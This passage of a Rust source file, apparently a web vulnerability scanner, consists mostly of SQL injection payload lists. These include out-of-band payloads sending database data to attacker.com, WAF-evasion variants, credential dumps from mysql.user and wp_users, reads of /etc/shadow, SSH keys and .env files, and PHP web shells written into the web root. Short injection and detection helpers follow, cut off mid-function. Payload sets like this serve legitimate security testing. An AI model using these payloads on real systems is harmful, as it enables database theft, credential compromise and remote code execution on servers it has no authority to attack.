    "'; CREATE TABLE test(id INT)--",
    "'; INSERT INTO test VALUES(1)--",
    "'; SELECT COUNT(*) INTO OUTFILE '/tmp/test.txt'--",
    "'; LOAD_FILE('/etc/passwd')--",
    "'; SELECT * INTO DUMPFILE '/tmp/stacked.txt'--",
    "'; SELECT 1--",
    "'; SELECT 1,2--",
    "'; SELECT version()--",
    "'; SELECT database()--",
    "'; SELECT user()--",
    "'; SHOW TABLES--",
    "'; SHOW DATABASES--",
    "'; SHOW COLUMNS FROM users--",
    "'; DESCRIBE users--",
    "'; UPDATE users SET password='x'--",
    "'; DELETE FROM users WHERE 1=0--",
    "'; ALTER TABLE test ADD COLUMN x INT--",
    "'; SELECT * FROM information_schema.tables--",
    "'; EXEC xp_cmdshell 'whoami'--",
    "'; EXEC master..xp_cmdshell 'whoami'--",
    "'; EXEC sp_configure 'show advanced options',1;RECONFIGURE--",
    "'; EXEC sp_who--",
    "'; EXEC sp_helpdb--",
    "'; SELECT 'GRYM_STACKED_TEST'--",
    "';SELECT 1--",
    "';  SELECT 1--",
    "'; SELECT/**/1--",
    "'; SELECT SLEEP(5)#",
    "'; SELECT SLEEP(5);--",
    "1; SELECT SLEEP(5)--",
    "1'; SELECT SLEEP(5)--",
    "1\"; SELECT SLEEP(5)--",
    "'); SELECT SLEEP(5)--",
    "'); SELECT 1--",
    "'; SELECT 1; SELECT 2--",
    "'; SELECT 1; SELECT 2; SELECT 3--",
    "'; DO SLEEP(5)--",
    "'; SET @x=1--",
    "'; SET @x=(SELECT SLEEP(5))--",
    "'; SELECT @x:=SLEEP(5)--",
    "'; HANDLER test OPEN--",
    "'; ANALYZE TABLE test--",
    "'; OPTIMIZE TABLE test--",
    "'; FLUSH PRIVILEGES--",
    "'; GRANT ALL PRIVILEGES ON *.* TO 'x'@'%' IDENTIFIED BY 'y'--",
    "'; SELECT SLEEP(5) INTO OUTFILE '/tmp/out2.txt'--",
    "'; DECLARE @t TABLE(x INT)--",
    "'; WAITFOR DELAY '0:0:5';--",
    "'; WAITFOR DELAY '0:0:5'-- -",
    "'; IF OBJECT_ID('tempdb..#t') IS NOT NULL DROP TABLE #t--",
    "'; EXECUTE('SELECT 1')--",
    "'; EXEC('SELECT 1')--",
    "'; EXECUTE sp_executesql N'SELECT 1'--",
    "'; SELECT * FROM OPENROWSET('SQLOLEDB','server=x','SELECT 1')--",
    "'; SELECT * FROM OPENQUERY(x,'SELECT 1')--",
    "'; CREATE DATABASE grym_test--",
    "'; DROP DATABASE grym_test--",
    "'; BACKUP DATABASE master TO DISK='C:\\grym.bak'--",
    "'; SELECT password FROM users--",
    "'; TRUNCATE TABLE test--",
    "'; RENAME TABLE test TO test2--",
    "'; SELECT pg_terminate_backend(pid) FROM pg_stat_activity--",
    "'; SELECT set_config('statement_timeout',0,false)--",
    "'; COPY (SELECT 'x') TO PROGRAM 'id'--",
    "'; CREATE TABLE t AS SELECT pg_sleep(5)--",
    "'; SELECT lo_create(12345)--",
    "'; SELECT * FROM pg_largeobject--",
    "'; DO $$ BEGIN PERFORM pg_sleep(5); END $$--",
    "'; SELECT pg_read_file('/etc/passwd')--",
    "'; SELECT pg_read_binary_file('/etc/passwd')--",
    "'; SELECT convert_from(pg_read_binary_file('/etc/passwd'),'UTF8')--",
    "'; SELECT (SELECT pg_read_file('/etc/passwd'))--",
    "'; SELECT current_setting('data_directory')--",
    "'; SELECT count(*) FROM generate_series(1,10000000)--",
    "'; EXECUTE IMMEDIATE 'SELECT 1'--",
    "'; BEGIN DBMS_LOCK.SLEEP(5); END;--",
    "'; UTL_HTTP.REQUEST('http://collaborator.example')--",
    "'; UTL_INADDR.GET_HOST_ADDRESS('collaborator.example')--",
    "'; HTTPURITYPE('http://collaborator.example').GETCLOB()--",
    "'; SELECT DBMS_UTILITY.EXEC_DDL_STATEMENT('CREATE TABLE t(x INT)') FROM dual--",
];

/// OOB (Out-of-Band) SQLi payloads for DNS/HTTP exfiltration (~60).
const OOB_SQLI_PAYLOADS: &[&str] = &[
    "' INTO OUTFILE '\\\\attacker.com\\share\\test.txt'--",
    "'; EXEC master..xp_dirtree '\\\\attacker.com\\\\share'--",
    "' AND (LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\share')))--",
    "'||UTL_HTTP.REQUEST('http://attacker.com/'+(SELECT user FROM dual))||'",
    "' INTO DUMPFILE '/tmp/\\\\attacker.com\\test'",
    "'; EXEC master..xp_fileexist '\\\\attacker.com\\x'--",
    "'; EXEC master..xp_subdirs '\\\\attacker.com\\x'--",
    "'; EXEC master..xp_cmdshell 'nslookup attacker.com'--",
    "'; EXEC master..xp_dirtree '\\\\attacker.com'--",
    "' AND 1=1; EXEC master..xp_dirtree '\\\\attacker.com'--",
    "' OR (SELECT LOAD_FILE('\\\\attacker.com\\x'))--",
    "' OR (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT DATABASE()),'.attacker.com\\x')))--",
    "' UNION SELECT LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\x'))--",
    "' UNION SELECT LOAD_FILE('\\\\attacker.com\\x')--",
    "' UNION SELECT LOAD_FILE(0x5c5c61747461636b65722e636f6d)--",
    "' AND (SELECT LOAD_FILE(0x5c5c61747461636b65722e636f6d5c78))--",
    "'; EXEC master..sp_oacreate 'WScript.Shell',@o out;EXEC master..sp_oamethod @o,'Run',NULL,'nslookup attacker.com'--",
    "'; EXEC master..xp_cmdshell 'ping attacker.com'--",
    "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') IS NOT NULL--",
    "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS(user||'.attacker.com') FROM dual) IS NOT NULL--",
    "' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user||'.attacker.com') FROM dual) IS NOT NULL--",
    "' AND (SELECT HTTPURITYPE('http://attacker.com/'||user).GETCLOB() FROM dual) IS NOT NULL--",
    "' AND (SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com',80) FROM dual) IS NOT NULL--",
    "' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/?d='||(SELECT user FROM dual)) FROM dual) IS NOT NULL--",
    "'||(SELECT UTL_HTTP.REQUEST('http://attacker.com/?d='||user FROM dual)||'",
    "' AND (SELECT SYS.DBMS_LDAP.INIT('attacker.com',80) FROM dual) IS NOT NULL--",
    "' AND (SELECT UTL_TCP.OPEN_CONNECTION('attacker.com',80,2) FROM dual) IS NOT NULL--",
    "' AND (SELECT UTL_INADDR.GET_HOST_NAME('127.0.0.1') FROM dual) IS NOT NULL--",
    "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/') FROM dual--",
    "'; SELECT DBMS_LDAP.INIT('attacker.com',80) FROM dual--",
    "' AND (SELECT pg_sleep(0) FROM pg_sleep(5))--",
    "' AND (SELECT pg_sleep(0) FROM pg_sleep(5)) IS NOT NULL--",
    "' AND 1=1; SELECT pg_read_file('/proc/self/status')--",
    "' AND (SELECT pg_read_file('/etc/passwd')) IS NOT NULL--",
    "' AND (SELECT (SELECT pg_read_file('/etc/passwd'))::text) IS NOT NULL--",
    "' AND 1=(SELECT (SELECT pg_read_file('/etc/passwd'))::text)--",
    "' OR 1=1; SELECT * FROM dblink('host=attacker.com','SELECT 1')--",
    "' OR 1=1; SELECT * FROM dblink_connect('host=attacker.com dbname=x')--",
    "' AND 1=1; COPY (SELECT 'x') TO PROGRAM 'nslookup attacker.com'--",
    "' AND 1=1; SELECT lo_import('/etc/passwd')--",
    "' AND 1=1; SELECT pg_write_file('/tmp/x.txt','x')--",
    "' AND (SELECT pg_write_file('/tmp/x.txt','GRYM')) IS NOT NULL--",
    "' OR (SELECT pg_write_file('/tmp/x.txt',user())) IS NOT NULL--",
    "' AND 1=1; SELECT net_tcp_send('attacker.com',80,'x')--",
    "1' OR (SELECT pg_sleep(5))--",
    "' AND (SELECT pg_sleep(5) FROM pg_sleep(0)) IS NOT NULL--",
    "'; SELECT 'x'; SELECT pg_sleep(5)--",
    "1'; SELECT pg_sleep(5);--",
    "' AND (SELECT 1 FROM (SELECT pg_sleep(5))x)--",
    "' AND (SELECT 1 FROM (SELECT pg_sleep(5))x)-- -",
    "1 AND (SELECT 1 FROM (SELECT pg_sleep(5))x)--",
    "' OR (SELECT 1 FROM (SELECT pg_sleep(5))x)='1'--",
    "' AND 1=(SELECT 1 FROM (SELECT pg_sleep(5))x)--",
    "'; COPY (SELECT 'x') TO PROGRAM 'id; nslookup attacker.com'--",
    "'; CREATE EXTENSION IF NOT EXISTS dblink--",
    "' AND (SELECT dblink_send_query('x','SELECT 1')) IS NOT NULL--",
    "'; SELECT dblink_connect('host=attacker.com')--",
    "' AND (SELECT 1 FROM dblink('host=attacker.com','SELECT 1') AS t(i int)) IS NOT NULL--",
];

/// Encoded URL variant SQLi payloads (~65).
const URL_ENCODED_SQLI: &[&str] = &[
    "%27%20OR%20%271%27%3D%271",
    "%27%20OR%201%3D1--",
    "%2527%2520OR%2520%25271%2527%253D%25271",
    "%27%2520OR%2520%25271%2527%253D%25271",
    "%22%20OR%20%221%22%3D%221",
    "%22%20OR%201%3D1--",
    "%27%20AND%201%3D1--",
    "%27%20AND%201%3D2--",
    "%27%20OR%20SLEEP(5)--",
    "%27%20UNION%20SELECT%20NULL--",
    "%27%20UNION%20SELECT%20NULL%2CNULL--",
    "%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--",
    "%27%20ORDER%20BY%201--",
    "%27%20ORDER%20BY%202--",
    "%27%20ORDER%20BY%203--",
    "%27%20ORDER%20BY%20100--",
    "%2527%2520OR%25201%253D1--",
    "%2527%2520OR%25201%253D1--%2520",
    "%2522%2520OR%25201%253D1--",
    "%25%32%37%20%4f%52%20%31%3d%31--",
    "%u0027%u0020OR%u00201%u003D1--",
    "%u27%u20OR%u201%u3D1--",
    "%c0%a7%20OR%20%c0%a7%31%c0%a7%3D%c0%a7%31",
    "%c0%af%20OR%201%3D1--",
    "%bf%27%20OR%201%3D1--",
    "%e0%80%a7%20OR%201%3D1--",
    "%27%09OR%091%3D1--",
    "%27%0aOR%0a1%3D1--",
    "%27%0dOR%0d1%3D1--",
    "%27%0bOR%0b1%3D1--",
    "%27%0cOR%0c1%3D1--",
    "%27%20%4f%52%20%31%3d%31--",
    "%27%20oR%20%31%3D%31--",
    "%27%20Or%201%3D1--",
    "%27%2f%2a%2a%2fOR%2f%2a%2a%2f1%3D1--",
    "%27%2f%2a%2a%2fUNION%2f%2a%2a%2fSELECT%2f%2a%2a%2fNULL--",
    "%2527%252f%252a%252a%252fOR%252f%252a%252a%252f1%253d1--",
    "%27%252f%252a%252a%252fOR%252f%252a%252a%252f1%253d1--",
    "%27%20OR%201%3D1%23",
    "%27%20OR%201%3D1%2D%2D",
    "%27%20OR%201%3D1%2D%2D%20",
    "%27%20OR%20%271%27%3D%271%27--",
    "%27%20OR%20%271%27%3D%271%27%23",
    "%27%20AND%20%271%27%3D%271",
    "%27%20AND%20%271%27%3D%272",
    "%27%20OR%20%27a%27%3D%27a",
    "%27%20OR%20%27a%27%3D%27b",
    "%22%20OR%20%22a%22%3D%22a",
    "%22%20OR%20%22a%22%3D%22b",
    "%27%29%20OR%20%28%271%27%3D%271",
    "%27%29%20AND%20%28%271%27%3D%271",
    "%27%29%29%20OR%20%28%28%271%27%3D%271",
    "%27%29%29%20AND%20%28%28%271%27%3D%271",
    "%27%20UNION%20SELECT%20%40%40version%2CNULL--",
    "%27%20UNION%20SELECT%20user%28%29%2Cdatabase%28%29--",
    "%27%20UNION%20SELECT%201%2C2%2C3--",
    "%27%20OR%20SLEEP(5)%20%23",
    "%27%20AND%20SLEEP(5)%23",
    "%27%3B%20SELECT%20SLEEP(5)--",
    "%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--",
    "%27%20OR%20BENCHMARK(5000000%2CSHA1('x'))--",
];

/// HTML entity encoded SQLi payloads (~30).
const HTML_ENTITY_SQLI: &[&str] = &[
    "&#x27; OR &#x27;1&#x27;&#x3D;&#x27;1",
    "&#39; OR &#39;1&#39;=&#39;1",
    "&#x22; OR &#x22;1&#x22;&#x3D;&#x22;1",
    "&#34; OR &#34;1&#34;=&#34;1",
    "&#x27; OR 1=1--",
    "&#39; OR 1=1--",
    "&#x27; AND &#x27;1&#x27;=&#x27;1",
    "&#39; AND &#39;1&#39;=&#39;1",
    "&#x27; OR SLEEP(5)--",
    "&#39; OR SLEEP(5)--",
    "&#x27; UNION SELECT NULL--",
    "&#39; UNION SELECT NULL--",
    "&#x27; UNION SELECT NULL&#x2C;NULL--",
    "&#39; UNION SELECT NULL&#44;NULL--",
    "&apos; OR &apos;1&apos;=&apos;1",
    "&apos; OR 1=1--",
    "&quot; OR &quot;1&quot;=&quot;1",
    "&quot; OR 1=1--",
    "&#x27; OR &#x27;a&#x27;&#x3D;&#x27;a",
    "&#x27; OR &#x27;a&#x27;&#x3D;&#x27;b",
    "&#x27;&#x3B; SELECT SLEEP(5)--",
    "&#x27; OR 1&#x3D;1--",
    "&#x27; AND 1&#x3D;2--",
    "&#x27; OR 1&#x3D;1&#x23;",
    "&#x27;&#x22;&#x3B;--",
    "&#x27;&#x3D;1&#x3D;1--",
    "&#x27;&#x2D;&#x2D;",
    "&#x27; OR 1=1&#x3B;--",
    "&#x27; OR &#x27;x&#x27;=&#x27;x&#x27;--",
    "&#x27; OR &#x27;x&#x27;=&#x27;y&#x27;--",
];

/// WAF bypass SQLi payloads — comment injection, whitespace tricks, case variation, Unicode homoglyphs (~160).
const WAF_BYPASS_SQLI: &[&str] = &[
    "/**/OR/**/1=1/**/",
    "/**/UNION/**/SELECT/**/NULL/**/",
    "'/**/OR/**/'1'/**/=/'1",
    "/*!SELECT*/ username,password FROM users",
    "/*!50000SELECT*/ * FROM users",
    "SEL/**/ECT * FROM users",
    "SeLeCt * FrOm users",
    "SEL ECT * FROM users",
    "SELECТ * FROM users",
    "UNION/**/ALL/**/SELECT",
    "1'/**/AND/**/(SELECT COUNT(*) FROM information_schema.tables)>0--",
    "1'/*!AND*/1=1--",
    "' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name LIKE '%')--",
    "0x27204f5220313d31",
    "0x27204f52002731273d2731",
    // ── Whitespace replacement with comments ─────────────────────────────
    "UNION/**/SELECT/**/NULL/**/NULL/**/NULL--",
    "UNION/**/ALL/**/SELECT/**/NULL--",
    "1/**/OR/**/1=1--",
    "1/**/AND/**/1=1--",
    "'/**/OR/**/1=1--",
    "'/**/AND/**/1=1--",
    "'/**/OR/**/'a'/**/='a",
    "'/**/UNION/**/SELECT/**/NULL--",
    "1'/**/UNION/**/SELECT/**/NULL--",
    "1'/**/ORDER/**/BY/**/1--",
    "1'/**/ORDER/**/BY/**/100--",
    "'/**/OR/**/SLEEP(5)/**/--",
    "'/**/AND/**/SLEEP(5)/**/--",
    // ── MySQL versioned comments ──────────────────────────────────────────
    "/*!50000UNION*/SELECT NULL--",
    "/*!50000SELECT*/1--",
    "/*!50000UNION*//*!50000SELECT*/NULL--",
    "1'/*!50000AND*/1=1--",
    "1'/*!50000OR*/1=1--",
    "/*!UNION*/ /*!SELECT*/ NULL--",
    "/*!50000IF(1=1,SLEEP(5),0)*/--",
    "1'/*!50000AND SLEEP(5)*/--",
    // ── Function / keyword splitting ──────────────────────────────────────
    "SEL/**/ECT 1",
    "SE/**/LECT 1",
    "UN/**/ION SELECT 1",
    "UNION /**/SELECT",
    "SEL/*x*/ECT 1",
    "SEL/*1*/ECT 1",
    "SEL/*!50000ECT*/1",
    "UN/*!50000ION*/SELECT 1",
    "SLEEP/**/(5)",
    "SLE/**/EP(5)",
    "SL/**/EEP(5)",
    "SLEEP/*x*/(5)",
    "DR/**/OP TABLE t--",
    "DR/**/OP/**/TABLE t--",
    "IN/**/TO OUTFILE--",
    "INTO/**/OUT/**/FILE--",
    "LOAD/**/_FILE('/etc/passwd')",
    "LOAD_FILE/**/('/etc/passwd')",
    // ── Case & munged case ────────────────────────────────────────────────
    "SeLeCt 1",
    "sElEcT 1",
    "sElEcT * FrOm t",
    "uNiOn SeLeCt NuLl",
    "UnIoN aLl SeLeCt 1,2,3",
    "oR 1=1",
    "oRdEr By 1",
    "aNd 1=1",
    "uNiOn SeLeCt",
    "SeLeCt/**/1",
    "sElEcT%201",
    // ── Alternate whitespace ──────────────────────────────────────────────
    "1%09OR%091=1",
    "1%0AOR%0A1=1",
    "1%0BOR%0B1=1",
    "1%0COR%0C1=1",
    "1%0DOR%0D1=1",
    "1%00OR%001=1",
    "1%20OR%201=1",
    "1%2520OR%25201=1",
    "1+OR+1=1",
    "1'%09OR%09'1'='1",
    "1'%0AOR%0A'1'='1",
    "'%09OR%091=1--",
    "'%0AOR%0A1=1--",
    "'%0BOR%0B1=1--",
    "'%0COR%0C1=1--",
    "'%0DOR%0D1=1--",
    // ── Unicode whitespace bypasses ───────────────────────────────────────
    "'\u{00a0}OR\u{00a0}1=1--",
    "'\u{00a0}UNION\u{00a0}SELECT\u{00a0}NULL--",
    "'\u{1680}OR\u{1680}1=1--",
    "'\u{2000}OR\u{2000}1=1--",
    "'\u{2001}OR\u{2001}1=1--",
    "'\u{2002}OR\u{2002}1=1--",
    "'\u{2003}OR\u{2003}1=1--",
    "'\u{2004}OR\u{2004}1=1--",
    "'\u{2005}OR\u{2005}1=1--",
    "'\u{2006}OR\u{2006}1=1--",
    "'\u{2007}OR\u{2007}1=1--",
    "'\u{2008}OR\u{2008}1=1--",
    "'\u{2009}OR\u{2009}1=1--",
    "'\u{200a}OR\u{200a}1=1--",
    "'\u{200b}OR\u{200b}1=1--",
    "'\u{202f}OR\u{202f}1=1--",
    "'\u{205f}OR\u{205f}1=1--",
    "'\u{3000}OR\u{3000}1=1--",
    "'\u{180e}OR\u{180e}1=1--",
    "'\u{0085}OR\u{0085}1=1--",
    "'\u{2028}OR\u{2028}1=1--",
    "'\u{2029}OR\u{2029}1=1--",
    "1\u{00a0}AND\u{00a0}1=1--",
    "1\u{2003}OR\u{2003}1=1--",
    // ── Cyrillic homoglyph obfuscation ────────────────────────────────────
    "SELЕСT 1",
    "UNIОN SЕLЕСT 1",
    "SЕLЕСT * FRОM users",
    "1 OR 1=1",
    "OР 1=1",
    "UNIОN/*!*/SЕLЕСT/*!*/NULL",
    // ── Fullwidth / halfwidth Unicode ─────────────────────────────────────
    "\u{ff27}\u{ff25}\u{ff2c}\u{ff25}\u{ff23}\u{ff34}\u{ff20}\u{ff0d}\u{ff0d}\u{ff1b}",
    "1\u{ff07} OR 1=1--",
    "1\u{ff42}\u{ff52} 1=1--",
    "SLEEP\u{ff08}5\u{ff09}",
    "SELECT\u{ff1c}\u{ff0d}\u{ff0d}",
    // ── Mathematical / fraction slash separators ──────────────────────────
    "UNION\u{2215}SELECT NULL--",
    "SEL\u{2215}ECT 1",
    "1 OR\u{2215}1=1--",
    "UN\u{2044}ION SELECT 1",
    // ── Concatenation / MySQL tricks ──────────────────────────────────────
    "1'||'a'='a",
    "1' AND 1=1--",
    "1' XOR 1=1--",
    "1' OR NOT 0--",
    "1' OR NOT(0)--",
    "' OR 'a' IN ('a')--",
    "' OR 1 IN (1)--",
    "1 AND (SELECT 1 FROM (SELECT 1)x)--",
    "' AND 1=1 UNION SELECT 1,2--",
    "' OR 1 GROUP BY 1--",
    "1' HAVING 1=1--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' ORDER BY 999--",
    "1' GROUP BY 1--",
    "1' GROUP BY 1,2--",
    // ── Hex / integer obfuscation ─────────────────────────────────────────
    "0x6f7220313d31",
    "0x6f720x20313d31",
    "0x4F5220313D31",
    "1 OR 0x313D31--",
    "1' OR 0x31=0x31--",
    "' OR 0x31=0x31--",
    "1' AND 0x31=0x31--",
    "UNION SELECT 0x6E756C6C--",
    // ── Backtick / ANSI_QUOTES ────────────────────────────────────────────
    "`OR` 1=1--",
    "1` OR 1=1--",
    "' OR `1`=`1`--",
    // ── Newline within keyword ────────────────────────────────────────────
    "SEL\nECT 1",
    "UNI\nON SELECT 1",
    "SEL\tECT 1",
    "SEL\rECT 1",
    "1' AND\n1=1--",
    // ── Regex-like generic match payloads ─────────────────────────────────
    "' OR RLIKE('^GRYM')--",
    "' OR RLIKE('.*')--",
    "1 AND RLIKE('.*')--",
    "' OR REGEXP '.*'--",
    "' OR 'a' LIKE '%'--",
    "' AND 'a' LIKE '%'--",
    // ── Misc WAF-evasion classics ─────────────────────────────────────────
    "' OR TRUE--",
    "' OR FALSE--",
    "' OR 1 IN (SELECT 1)--",
    "' OR 1 NOT IN (SELECT 2)--",
    "' OR NULL--",
    "1' OR NULL--",
    "' OR '1'='1'--",
    "1' AND '1'='1'--",
    "1' AND '1'='2'--",
    "' OR '1'='2' OR '1'='1'--",
    "' AND 1=1 UNION ALL SELECT NULL--",
    "1' AND 1=1 UNION ALL SELECT NULL--",
    "' AND 1=1 UNION ALL SELECT NULL,NULL--",
    "1' AND 1=1 UNION ALL SELECT NULL,NULL--",
    "' AND 1=2 UNION ALL SELECT NULL--",
    "1' AND 1=2 UNION ALL SELECT NULL--",
    "' AND 1=2 UNION ALL SELECT 1,2--",
    "1' AND 1=2 UNION ALL SELECT 1,2--",
    "1' AND 1=2 UNION ALL SELECT 'a','b'--",
    "1' AND 1=2 UNION ALL SELECT 1,2,3--",
    "1' AND 1=2 UNION ALL SELECT 'a','b','c'--",
    "1' AND 1=2 UNION SELECT 1,2,3--",
    "' OR 1=1 LIMIT 1--",
    "1' OR 1=1 LIMIT 1--",
    "' OR 1=1 OFFSET 0--",
    "1' OR 1=1 OFFSET 0--",
    "' OR 1=1 GROUP BY 1--",
    "1' OR 1=1 GROUP BY 1--",
    "' OR 1=1 HAVING COUNT(*)>0--",
    "1' OR 1=1 HAVING COUNT(*)>0--",
];

/// Multi-stage SQLi payloads for advanced exploitation (~70).
const MULTI_STAGE_SQLI: &[&str] = &[
    "' UNION SELECT LOAD_FILE('/etc/passwd')--",
    "' UNION SELECT LOAD_FILE(CHAR(47,101,116,99,47,112,97,115,115,119,100))--",
    "' UNION SELECT @@datadir INTO OUTFILE '/var/www/html/shell.php'--",
    "' UNION SELECT '<?php eval($_POST[cmd]);?>' INTO DUMPFILE '/var/www/html/shell.php'--",
    "' UNION SELECT (SELECT user()) INTO OUTFILE '/tmp/web.txt'--",
    "' UNION SELECT md5('GRYM_TEST')--",
    "' UNION SELECT (SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1)--",
    "' AND 1 IN (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())--",
    "' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--",
    "' UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database()--",
    "' UNION SELECT 1,GROUP_CONCAT(DISTINCT table_name) FROM information_schema.columns--",
    "' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata--",
    "' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='information_schema'--",
    "' UNION SELECT 1,GROUP_CONCAT(user,0x3a,password) FROM mysql.user--",
    "' UNION SELECT 1,GROUP_CONCAT(User,0x3a,Password) FROM mysql.user--",
    "' UNION SELECT 1,GROUP_CONCAT(host,user,authentication_string) FROM mysql.user--",
    "' UNION SELECT 1,GROUP_CONCAT(table_schema,0x3a,table_name) FROM information_schema.tables--",
    "' UNION SELECT 1,GROUP_CONCAT(table_name,0x3a,column_name) FROM information_schema.columns--",
    "' UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x7573657273--",
    "' UNION SELECT 1,CONCAT(table_name,0x7c,column_name) FROM information_schema.columns WHERE table_schema=DATABASE() LIMIT 1--",
    "' UNION SELECT 1,CONCAT(user(),0x7c,database(),0x7c,version())--",
    "' UNION SELECT 1,CONCAT(user,0x3a,password) FROM users--",
    "' UNION SELECT 1,CONCAT(login,0x3a,pass) FROM admins--",
    "' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password) FROM admins--",
    "' UNION SELECT 1,GROUP_CONCAT(email,0x3a,passwd) FROM members--",
    "' UNION SELECT 1,CONCAT(username,0x3a,password) FROM wp_users--",
    "' UNION SELECT 1,GROUP_CONCAT(user_login,0x3a,user_pass) FROM wp_users--",
    "' UNION SELECT 1,GROUP_CONCAT(name,0x3a,password) FROM drupal_users--",
    "' UNION SELECT 1,GROUP_CONCAT(uid,0x3a,name,0x3a,pass) FROM users--",
    "' UNION SELECT 1,GROUP_CONCAT(db_user,0x3a,db_pass) FROM config--",
    "' UNION SELECT 1,GROUP_CONCAT(setting_name,0x3a,setting_value) FROM settings--",
    "' UNION SELECT 1,GROUP_CONCAT(option_name,0x3a,option_value) FROM wp_options WHERE option_name LIKE '%pass%'--",
    "' UNION SELECT 1,GROUP_CONCAT(option_name,0x3a,option_value) FROM wp_options WHERE option_name IN('siteurl','home')--",
    "' UNION SELECT 1,LOAD_FILE('/etc/passwd')--",
    "' UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764)--",
    "' UNION SELECT 1,LOAD_FILE('/etc/shadow')--",
    "' UNION SELECT 1,LOAD_FILE('/etc/hosts')--",
    "' UNION SELECT 1,LOAD_FILE('/etc/group')--",
    "' UNION SELECT 1,LOAD_FILE('/etc/crontab')--",
    "' UNION SELECT 1,LOAD_FILE('/proc/self/environ')--",
    "' UNION SELECT 1,LOAD_FILE('/proc/self/cmdline')--",
    "' UNION SELECT 1,LOAD_FILE('/proc/version')--",
    "' UNION SELECT 1,LOAD_FILE('/proc/mounts')--",
    "' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php')--",
    "' UNION SELECT 1,LOAD_FILE('/var/www/html/.env')--",
    "' UNION SELECT 1,LOAD_FILE('/var/www/.env')--",
    "' UNION SELECT 1,LOAD_FILE('/home/user/.ssh/id_rsa')--",
    "' UNION SELECT 1,LOAD_FILE('/root/.ssh/authorized_keys')--",
    "' UNION SELECT 1,LOAD_FILE('C:\\boot.ini')--",
    "' UNION SELECT 1,LOAD_FILE('C:\\windows\\win.ini')--",
    "' UNION SELECT 1,LOAD_FILE('C:\\windows\\system32\\drivers\\etc\\hosts')--",
    "' UNION SELECT 1,LOAD_FILE('C:\\inetpub\\wwwroot\\web.config')--",
    "' UNION SELECT 1,LOAD_FILE('C:\\inetpub\\wwwroot\\Global.asax')--",
    "' UNION SELECT '<?php system($_GET[c]);?>',2,3 INTO OUTFILE '/var/www/html/grym.php'--",
    "' UNION SELECT '<?php eval($_POST[x]);?>',2 INTO DUMPFILE '/var/www/html/grym2.php'--",
    "' UNION SELECT 0x3C3F70687020706870696E666F28293B3F3E INTO OUTFILE '/var/www/html/info.php'--",
    "' UNION SELECT 1,@@datadir INTO OUTFILE '/tmp/datadir.txt'--",
    "' UNION SELECT 1,@@tmpdir INTO OUTFILE '/tmp/tmpdir.txt'--",
    "' UNION SELECT 1,@@secure_file_priv INTO OUTFILE '/tmp/sfp.txt'--",
    "' UNION SELECT 1,@@plugin_dir INTO OUTFILE '/tmp/plugindir.txt'--",
    "' UNION SELECT 1,@@general_log_file INTO OUTFILE '/tmp/glf.txt'--",
    "' UNION SELECT 1,@@slow_query_log_file INTO OUTFILE '/tmp/sqlf.txt'--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--",
    "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database())>0--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0--",
    "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE column_name LIKE '%pass%')>0--",
    "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE column_name='password')>0--",
    "' AND ORD(MID((SELECT IFNULL(CAST(DATABASE() AS CHAR),0)),1,1))=100--",
    "' AND ORD(MID((SELECT IFNULL(CAST(user() AS CHAR),0)),1,1))=114--",
    "' AND (SELECT SUBSTRING(version(),1,1))='5'--",
    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
    "' AND (SELECT MID(version(),1,1))='8'--",
];

const DBMS_COMMENT: &str = " /**/ ";

/// Full list of all URL parameters in a URL query or in the request body.
fn get_all_params(url: &Url) -> Vec<(String, String)> {
    url.query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect()
}

/// Injects a payload into one parameter while preserving others.
fn inject_payload(
    url: &Url,
    params: &[(String, String)],
    target_param: &str,
    payload: &str,
) -> Url {
    let mut test_url = url.clone();
    {
        let mut pairs = test_url.query_pairs_mut();
        pairs.clear();
        for (k, v) in params {
            let val = if k == target_param {
                payload.to_string()
            } else {
                v.clone()
            };
            pairs.append_pair(k, &val);
        }
    }
    test_url
}

/// Checks response body for a SQL error pattern match.
fn check_sql_error(body: &str, _payload: &str, param_name: &str, url: &Url) -> Option<Finding> {
    for pattern in SQL_ERROR_PATTERNS {
        if let Ok(re) = Regex::new(pattern)
            && re.is_match(body)
        {
            return Some(Finding::new(
                format!("SQL Injection (error-based) in parameter '{}'", param_name),
                AssetRef {
                    identifier: url.to_string(),
                    kind: "web".into(),
                },
                Severity::Critical,
                Confidence::Confirmed,
                "grym-web-scanner",
            ));
        }
    }
    None
}

/// Checks if response time suggests a time-based blind SQLi condition.
fn check_time_based_indicator(body: &str, response_time_ms: u128) -> bool {
    if response_time_ms > 3000 {
        return true;
    }
    for pattern in SQL_ERROR_PATTERNS {
        if let Ok(re) = Regex::new(pattern)
            && re.is_match(body)
        {
